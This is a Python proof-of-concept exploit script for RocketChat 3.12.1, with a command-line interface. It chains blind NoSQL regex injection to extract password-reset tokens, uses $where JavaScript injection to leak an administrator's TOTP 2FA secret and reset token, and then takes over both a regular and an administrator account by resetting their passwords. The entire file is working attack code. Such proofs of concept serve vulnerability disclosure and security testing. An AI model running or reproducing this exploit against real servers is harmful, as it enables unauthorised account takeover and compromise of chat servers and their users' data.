
import argparse
import hashlib
import json
import oathtool
import requests
import time
from typing import Dict, Tuple, Union
import urllib.parse


class RcexplContext:
    def __init__(self, endpoint: str):
        self.endpoint = endpoint

    def _log(self, ok: Union[bool, None], msg: str, end: str = '\n') -> None:
        """ Print log to stdout. Trigger program exit upon error. You may
        specify an alternate line break by using [end]. """
        info = {True: '[ok]    ', False: '[error] ', None: ' -      '}[ok]
        print(info + str(msg), end=end)
        if ok is False:
            exit(0)

    def _post(self, url: str, payload: Dict) -> str:
        """ Send Dict to server, receiving raw text as a response. """
        return requests.post(
            self.endpoint + url,
            data=json.dumps(payload),
            headers={'Content-Type': 'application/json'},
            verify=False,
            allow_redirects=False,
        ).text

    def forget_password(self, email):
        """ Send 'forgot password' email to target account. """
        message = json.dumps({
            'msg': 'method',
            'method': 'sendForgotPasswordEmail',
            'params': [email]
        })
        payload = {'message': message}
        req = self._post('/api/v1/method.callAnon/sendForgotPasswordEmail',
                         payload)
        self._log(True, f'password reset email sent => {email}')

    def steal_token(self) -> None:
        """ Use blind NoSQL injection to retrieve token. Does not require a
        specification of the target user. This works for both regular users
        and administrators. """
        # possible token characters
        ch_lower = ''.join(chr(ord('a') + i) for i in range(26))
        ch_num = ''.join(str(i) for i in range(10))
        chs = list(ch_lower + ch_lower.upper() + ch_num + '-_')
        # the reset token is 43 chars long
        token = ''
        while len(token) < 43:
            for ch in chs:
                # as it's a proof of concept, we're not using binary search
                # or somewhat advanced algorithms to accelerate this atm
                message = json.dumps({
                    'msg': 'method',
                    'method': 'getPasswordPolicy',
                    'params': [{
                        'token': {'$regex': '^%s' % (token + ch)},
                    }],
                })
                payload = {'message': message}
                req = self._post('/api/v1/method.callAnon/getPasswordPolicy',
                                 payload)
                # check if this is the right character
                if 'Meteor.Error' not in req:
                    token += ch
                    self._log(None, f'got token: {token}', end='\r')
                    break
        # show off the token retrieved
        self._log(True, f'user reset token -> {token}')
        return token

    def change_password(self, token: str, password: str) -> None:
        """ Change password of users who DOES NOT have 2FA ON, with stolen
        reset token and target password """
        message = json.dumps({
            'msg': 'method',
            'method': 'resetPassword',
            'params': [token, password],
        })
        payload = {'message': message}
        req = self._post('/api/v1/method.callAnon/resetPassword', payload)
        if 'error' in req:
            self._log(False, f'token failed: {req}')
        self._log(True, f'password changed to "{password}"')

    def auth_user(self, email: str, password: str) -> Tuple[str, str]:
        """ Authenticates with regular user's [email] and [password]. Returns
        its [userid] and [utoken]. """
        password_h = hashlib.sha256(password.encode('utf-8')).hexdigest()
        message = json.dumps({
            'msg': 'method',
            'method': 'login',
            'params': [{
                'user': {'email': email},
                'password': {'digest': password_h, 'algorithm': 'sha-256'},
            }],
        })
        payload = {'message': message}
        req = self._post('/api/v1/method.callAnon/login', payload)
        if 'error' in req:
            self._log(False, f'failed to authenticate: {req}')
        res = json.loads(json.loads(req)['message'])['result']
        userid = res['id']
        utoken = res['token']
        self._log(True, f'successfully authenticated as {email}')
        self._log(None, f'  userid = {userid}')
        self._log(None, f'  utoken = {utoken}')
        return userid, utoken

    def leak_2fa_secret(self, userid: str, utoken: str, username: str) -> str:
        """ Use NoSQL injection to leak out [username]'s TOTP secret.
        * use [auth_user] on email and password to retrieve [userid] et al.
        * preferrably, [userid] would be a regular user.
        * [userid] must be either holding the 'view-d-room' permission or be
          of a role holding this permission (e.g. Users)
        * administrator [username] must have Timed OTP enabled. email 2fa
          does not work on this case. """
        query = urllib.parse.quote(json.dumps({
            "$where": ("this.username === '%s' && (() => {"
                       "throw this.services.totp.secret})()") % username,
        }))
        req = requests.get(
            f'{self.endpoint}/api/v1/users.list?query={query}',
            cookies={'rc_uid': userid, 'rc_token': utoken},
            headers={'X-User-Id': userid, 'X-Auth-Token': utoken},
        ).text
        code = json.loads(req)['error'].replace('uncaught exception: ', '')
        self._log(True, f'2fa totp secret -> {code}')
        return code

    def steal_token_admin(self, userid: str, utoken: str, username: str
                          ) -> str:
        """ Steals administrator [username]'s password reset token with given
        credentials (in accordance to [auth_user]).
        * preferrably, [userid] would be an ordinary user. """
        query = urllib.parse.quote(json.dumps({
            "$where": ("this.username === '%s' && (() => {"
                       "throw this.services.password.reset.token})()"
                       ) % username,
        }))
        req = requests.get(
            f'{self.endpoint}/api/v1/users.list?query={query}',
            cookies={'rc_uid': userid, 'rc_token': utoken},
            headers={'X-User-Id': userid, 'X-Auth-Token': utoken},
        ).text
        code = json.loads(req)['error'].replace('uncaught exception: ', '')
        self._log(True, f'admin reset token -> {code}')
        return code

    def change_password_admin(self, token: str, password: str,
                              totp: str) -> None:
        """ Changing administrator password using TOTP 2FA. Password reset
        [token] must be given. """
        message = json.dumps({
            'msg': 'method',
            'method': 'resetPassword',
            'params': [
                token,
                password,
                {
                    'twoFactorCode': totp,
                    'twoFactorMethod': 'totp',
                },
            ],
        })
        payload = {'message': message}
        req = self._post('/api/v1/method.callAnon/resetPassword', payload)
        if '403' in req:
            self._log(False, f'invalid token: {req}')
        self._log(True, f'admin password changed -> "{password}"')

    def pwn(self, user_email: str, user_password: str, admin_email: str,
            admin_password: str, admin_username: str) -> None:
        """ Perform exploit on the target machine by resetting passwords. Will
        continuously show a stream of TOTP secret and generated OTPs.
        @param user_email: The low privellege user's email
        @param user_password: Change the low priv user's password into this
        @param admin_email: Administrator email
        @param admin_password: Change the administrator's password into this
        @param admin_username: The administrator's user handle """
        # on the user side
        self._log(None, f'resetting password => {user_email}')
        self.forget_password(user_email)
        user_token = self.steal_token()
        self.change_password(user_token, user_password)
        # on the admin side
        userid, utoken = self.auth_user(user_email, user_password)
        totp_secret = self.leak_2fa_secret(userid, utoken, admin_username)
        self._log(None, f'resetting password => {admin_email}')
        self.forget_password(admin_email)
        admin_token = self.steal_token_admin(userid, utoken, admin_username)
        totp = oathtool.generate_otp(totp_secret)
        self.change_password_admin(admin_token, admin_password, totp)
        # show password, secret and otp
        while True:
            totp = oathtool.generate_otp(totp_secret)
            self._log(None, f'pw="{admin_password}"; secret={totp_secret}; '
                      f'totp={totp}', end='\r')
            time.sleep(1.0)
        return
    pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='RocketChat 3.12.1 Exploit')
    parser.add_argument('-u', help='regular user email w/o 2fa', required=True)
    parser.add_argument('-p', help='regular user new password', required=True)
    parser.add_argument('-n', help='admin username', required=True)
    parser.add_argument('-a', help='admin email w/ totp 2fa', required=True)
    parser.add_argument('-k', help='admin new password', required=True)
    parser.add_argument('-e', help='endpoint (e.g. http://localhost:3000)',
        required=True)
    args = parser.parse_args()
    # start exploit context
    rc = RcexplContext(args.e)
    rc.pwn(
        user_email=args.u,
        user_password=args.p,
        admin_email=args.a,
        admin_password=args.k,
        admin_username=args.n,
    )
